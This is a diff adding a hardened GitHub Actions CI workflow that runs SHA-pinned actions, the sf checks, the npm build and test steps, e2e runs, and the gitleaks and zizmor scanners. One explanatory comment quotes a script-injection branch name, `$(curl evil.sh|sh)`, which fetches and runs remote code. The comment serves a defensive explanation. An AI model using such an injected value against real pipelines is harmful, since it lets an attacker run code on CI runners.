@@ -1,0 +1,159 @@
+name: software factory
+
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  factory:
+    runs-on: ubuntu-latest
+    steps:
+      # Actions are pinned by commit SHA, never by tag: a tag is a mutable
+      # pointer the action's owner can move under you, and a SHA is the only
+      # immutable release GitHub offers. The trailing comment is the version,
+      # because a bare SHA tells a reader nothing and gives a bump nothing to
+      # aim at.
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          fetch-depth: 0
+          # this job never pushes, so the checkout token has no reason to stay
+          # behind in .git/config where a later step can read it back out
+          persist-credentials: false
+      # Pinned to a tag, not to the tip of main. The catalog ships inside
+      # the binary, so tracking main means an upstream commit can change
+      # what an enabled rule matches and turn this build red with nothing
+      # in this repository having moved. Bump this deliberately, then run
+      # `sf lock`: L2.CATALOG_ONLY_TIGHTENS reports every enabled rule the
+      # upgrade made weaker.
+      - name: Install sf
+        run: cargo install --git https://github.com/nicolasmelo1/software-factory --tag v0.3.0 --locked
+      # verify first: a check that stopped firing makes the run below
+      # meaningless, and it is the cheaper failure to discover.
+      #
+      # --allow-commands on both: one rule here regenerates docs/rules.md and
+      # compares, and without the flag it reports itself as unrunnable rather
+      # than passing. The policy naming it is hash-locked.
+      - name: Prove the checks still fire
+        run: sf verify --allow-commands
+      # base_ref is the pull request author's branch name, and on a fork they
+      # choose it. Interpolated straight into `run:` that is script injection:
+      # the ${{ }} is substituted into the script before any shell sees it, so
+      # a branch named `$(curl evil.sh|sh)` executes as the runner. Through
+      # `env:` the value arrives as a variable the shell expands but never
+      # re-parses.
+      - name: Check the repository
+        env:
+          BASE_REF: ${{ github.base_ref || 'main' }}
+        run: sf check --allow-commands --changed "origin/$BASE_REF"
+
+  # The npm half of the gate. Until now nothing here ran outside a laptop:
+  # the tests, the linter, the dead-code detector and the audit were all one
+  # person remembering to run them. `sf check` cannot see any of that, it can
+  # only see that the tools are wired.
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          # this job never pushes, so the checkout token has no reason to stay
+          # behind in .git/config where a later step can read it back out
+          persist-credentials: false
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: 24
+          cache: npm
+      - run: npm ci
+      - run: npm run build
+      - run: npm run test:coverage
+      - run: npm run lint
+      # Dead code is the residue of work that changed direction. Nobody
+      # deletes it by hand because nobody can prove it is unreachable.
+      - run: npm run knip
+      - run: npm run audit
+      # Reports rather than fails: a runner's hardware is not this laptop, so
+      # a threshold here would be a coin toss. An accidental quadratic is not
+      # subtle enough to hide in the noise.
+      - run: npm run bench
+
+  # The end-to-end runs, which are the ones that drive what somebody installs
+  # rather than what a test imports. They need bun, because the single
+  # executable is what they drive and `bun build --compile` is what makes one.
+  #
+  # No credential and no network: the tracker is a process on a loopback
+  # socket and the code host and the agent are executables on the PATH, so
+  # this job is exactly as repeatable as it is on a laptop. It reseals
+  # nothing — a run that disagrees with the sealed evidence is a finding, and
+  # `sf check` in the job above is what reports it.
+  e2e:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          persist-credentials: false
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version: 24
+          cache: npm
+      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0
+        with:
+          bun-version: latest
+      - run: npm ci
+      - run: npm run build
+      # No git identity step: the scenario's repositories carry their own,
+      # set per checkout, because the run also moves HOME out from under the
+      # program on purpose and a global identity would not be there.
+      - run: npm run e2e
+
+  # The scanners that are not npm packages and cannot be a script in
+  # package.json. They read the repository and the workflows rather than the
+  # application, so they need no toolchain of their own.
+  hazards:
+    runs-on: ubuntu-latest
+    # The secret scanner asks the API which commits a pull request adds, and
+    # on a private repository the workflow-wide `contents: read` leaves that
+    # endpoint closed. Granted here rather than at the top, so the other two
+    # jobs still cannot read a pull request.
+    permissions:
+      contents: read
+      pull-requests: read
+    steps:
+      # fetch-depth: 0 because the secret scanner diffs against the base
+      # commit on a pull request, and a shallow clone leaves it nothing to
+      # diff against. It then fails with an empty result and no explanation.
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+      # This repository's own history carries credentials that predate it
+      # being what it is now. The action scans what a pull request adds, which
+      # is the question worth failing on; the ones already in the history are
+      # a revocation, not a build failure.
+      - name: Committed secrets
+        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2.3.9
+        # The action refuses to scan a pull request without a token, and says
+        # so only at run time. The two flags stop it reaching for permissions
+        # this job does not grant, which it does by posting a comment and then
+        # failing 403.
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITLEAKS_ENABLE_COMMENTS: "false"
+          GITLEAKS_ENABLE_SUMMARY: "false"
+      # The workflows are code too, and they are the code holding the tokens.
+      # actionlint is not the tool for this: it validates syntax and
+      # expressions, and stays green on the injection this catches.
+      - name: Insecure workflows
+        uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2
+        with:
+          # Point it at the real workflows only. Left to walk the repository
+          # it also audits .software-factory/mutations, whose workflows are
+          # deliberately broken.
+          inputs: .github/workflows/
+          # the SARIF upload wants security-events: write, which this job does
+          # not grant. Annotations put each finding on the diff instead, and
+          # zizmor still exits non-zero, which is what fails the build.
+          advanced-security: false
+          annotations: true
